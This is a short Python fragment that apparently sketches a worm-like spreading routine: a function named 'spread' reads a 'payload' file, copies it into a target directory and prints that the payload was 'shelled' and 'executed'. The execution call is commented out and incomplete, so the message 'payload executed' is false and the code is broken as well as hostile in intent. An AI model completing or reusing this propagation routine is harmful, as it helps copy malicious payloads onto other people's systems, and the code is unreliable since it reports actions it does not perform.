import os
import sys

def spread(dirpath):
    dp = str(dirpath)+'/t'
    f = open('t.txt', 'rb')
    fd = f.read()
    f.close()
    print('payload loaded')
    f = open(dp, 'wb')
    f.write(fd)
    f.close()
    print('payload shelled to ' + dp)
    os.chdir(str(dirpath))
    #os.system('./')
    print('payload executed')